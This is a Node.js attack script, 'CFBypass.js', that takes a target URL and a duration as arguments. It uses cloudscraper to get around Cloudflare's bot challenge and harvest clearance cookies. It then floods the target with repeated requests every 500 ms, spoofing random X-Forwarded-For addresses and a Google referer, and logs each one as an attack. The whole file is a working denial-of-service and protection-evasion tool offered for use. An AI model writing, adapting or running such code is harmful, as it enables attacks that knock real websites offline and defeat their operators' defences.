var cloudscraper = require('cloudscraper');
var request = require('request');
var randomstring = require("randomstring");

var args = process.argv.slice(2);

randomByte = function() {
    return Math.round(Math.random() * 256);
}

if (process.argv.length <= 2) {
    console.log("Usage: node CFBypass.js <url> <time>");
    process.exit(-1);
}

var url = process.argv[2];
var time = process.argv[3];
var successfulCookies = null;
var userAgent = null;
var isGettingCookies = false;
var cookiesScraped = false;

// SCRAPE COOKIES ONLY ONCE at the beginning
function scrapeCookiesOnce(callback) {
    if (isGettingCookies) return;
    
    isGettingCookies = true;
    console.log('🔄 Scraping Cloudflare cookies...');
    
    cloudscraper.get(url, function(error, response, body) {
        isGettingCookies = false;
        
        if (error) {
            console.log('❌ Cloudscraper error:', error.message);
            callback(error);
            return;
        }
        
        console.log('✅ Cloudscraper status:', response.statusCode);
        
        // Extract cookies from the successful response
        var cookies = '';
        if (response.headers['set-cookie']) {
            var setCookies = response.headers['set-cookie'];
            if (Array.isArray(setCookies)) {
                cookies = setCookies.map(function(cookie) {
                    return cookie.split(';')[0];
                }).join('; ');
            } else {
                cookies = setCookies.split(';')[0];
            }
            console.log('🍪 Obtained cookies:', cookies.substring(0, 50) + '...');
        }
        
        // Get user agent
        userAgent = response.request.headers['User-Agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
        
        successfulCookies = cookies;
        cookiesScraped = true;
        callback(null, cookies);
    });
}

// MAKE REQUESTS USING THE SAME COOKIES
function makeRequest() {
    if (!cookiesScraped) {
        console.log('⏳ Waiting for cookies to be scraped...');
        return;
    }
    
    var rand = randomstring.generate(10);
    var ip = randomByte() + '.' + randomByte() + '.' + randomByte() + '.' + randomByte();
    
    const options = {
        url: url,
        headers: {
            'User-Agent': userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Cookie': successfulCookies, // REUSE THE SAME COOKIES
            'X-Forwarded-For': ip,
            'Referer': 'https://www.google.com/'
        },
        timeout: 10000
    };

    request(options, function(error, response, body) {
        if (error) {
            console.log('Request error:', error.message);
        } else {
            console.log('Attack successful. Status:', response.statusCode, 'IP:', ip);
        }
    });
}

// MAIN EXECUTION
console.log('🚀 Starting attack on:', url);

// SCRAPE COOKIES ONLY ONCE at the beginning
scrapeCookiesOnce(function(error, cookies) {
    if (error) {
        console.log('❌ Failed to get cookies. Exiting.');
        process.exit(1);
    }
    
    console.log('✅ Cookies scraped successfully! Starting attacks with same cookies...');
    
    // NOW START MAKING REQUESTS WITH THE SAME COOKIES
    var requestCount = 0;
    var int = setInterval(function() {
        requestCount++;
        console.log('📨 Sending request #' + requestCount + ' with same cookies');
        makeRequest();
    }, 500); // 500ms interval
    
    // Stop after specified time
    setTimeout(() => {
        clearInterval(int);
        console.log('✅ Attack finished after', time, 'seconds');
        console.log('📊 Total requests sent:', requestCount);
        process.exit(0);
    }, time * 1000);
});

process.on('uncaughtException', function(err) {
    console.log('Uncaught Exception:', err.message);
});

process.on('unhandledRejection', function(err) {
    console.log('Unhandled Rejection:', err.message);
});
